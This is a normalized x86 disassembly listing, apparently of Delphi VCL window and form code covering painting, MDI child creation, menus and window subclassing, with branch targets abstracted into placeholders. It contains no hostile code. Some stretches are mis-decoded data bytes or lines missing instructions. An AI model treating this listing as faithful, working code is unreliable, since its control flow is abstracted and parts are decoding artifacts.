pop ebp
retn
sub_452044
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_452212
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41c9e4
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43cedc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_438584
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43737c
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_451fb8
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41c9e4
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_4524e0
test eax eax
je r-xdata
push ebp
call sub_451fb8
pop ecx
push ebp
call sub_451fb8
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_452004
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_44f31c
jmp r-xdata
sub_452224
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_4504ec
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_452290
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_450b88
mov eax ebx
call sub_43f52c
test al al
je r-xdata
mov eax ebx
call sub_419770
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_43f228
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_43c04c
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_43f228
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_419744
call sub_44c7e0
mov edx esi
mov eax ebx
call sub_419744
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
sub_452328
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_4523a5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_4523b0
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43c7c8
sub_4523dc
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_43c7c8
xor edx edx
jmp r-xdata
mov eax esi
call sub_450668
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_452414
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_438244
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_43c7c8
sub_452458
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_438350
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_4524ac
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_435920
sub_4524e0
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_456050
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_45603c
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_45252c
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_456050
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45603c
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_45257c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_413650
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_4525ac
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_43f228
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_456020
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_456020
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_45257c
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_456020
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45600c
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_4137ac
call sub_403258
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45600c
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45600c
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45600c
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_4526b0
push ebx
mov ebx eax
mov eax ebx
call sub_4526a8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_4215dc
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4526d8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_43c780
mov dl 0x1
mov eax esi
call sub_452a3c
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_452ab8
mov edx eax
mov eax esi
call sub_438be0
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_43c91c
mov dl 0x1
mov eax esi
call sub_451a5c
sub_452758
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_43f228
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_448ddc
mov edi eax
mov eax ebp
call sub_43f228
push eax
call DrawMenuBar
sub_4527d4
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_41921c
xor edx edx
mov eax ebx
call sub_44a774
sub_4527f8
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_452758
mov eax edx
mov edx ebx
call sub_41921c
sub_452820
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4529e6
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_456050
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_44c328
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45603c
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_41921c
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45603c
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
call sub_4039cc
mov eax ebx
call sub_43f52c
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_43f228
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_452758
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4529ed
lea eax [ ebp - 0x10 ]
call sub_403f90
retn
mov dl 0x1
mov eax ebx
call sub_4538e4
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_43f52c
test al al
je r-xdata
mov eax ebx
call sub_43f52c
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_43f228
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_43f228
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_43f228
mov edx eax
mov eax esi
call sub_44c328
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_43f228
push eax
call SetMenu
sub_452a08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4529f4
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_452a64
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_452a58
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_452ad0
push ebx
mov ebx eax
mov eax ebx
call sub_43e840
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_452ab8
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_452ab8
mov edx eax
mov eax ebx
call sub_438be0
mov edx 0xff00000f
mov eax ebx
call sub_438be0
pop ebx
retn
sub_452b54
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_43f228
push eax
call ShowWindow
sub_452b94
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4525ac
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_4525ac
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_456020
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45600c
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_4525ac
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45600c
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_456020
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45600c
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455d10
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455cf4
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455cdc
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45600c
call sub_455cdc
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455cdc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455d28
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455d10
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455cf4
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455cdc
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455d28
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455d10
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_45600c
call sub_455d10
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455d10
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455cf4
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455cdc
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455d28
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455cdc
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455d28
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455d10
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45600c
call sub_455cf4
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_452ee8
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_45049c
mov edx esi
mov eax edi
call sub_45588c
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_452f97 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_43c04c
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_43c04c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_4530f9
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4504ac
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_43f228
push eax
call SendMessageA
mov eax ebx
call sub_453a58
push eax
push 0x1
push 0x80
mov eax ebx
call sub_43f228
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_438444
push eax
mov eax ebx
call sub_438488
push eax
mov eax ebx
call sub_43f228
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_4068e4
mov [ ebx + 0x254 ] eax
push ebx
push sub_452044
call sub_41a1f0
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_448ddc
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_43f228
push eax
call SetWindowPos
jmp r-xdata
sub_453246
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_453371
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_43c3b0
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_455764
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453378
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
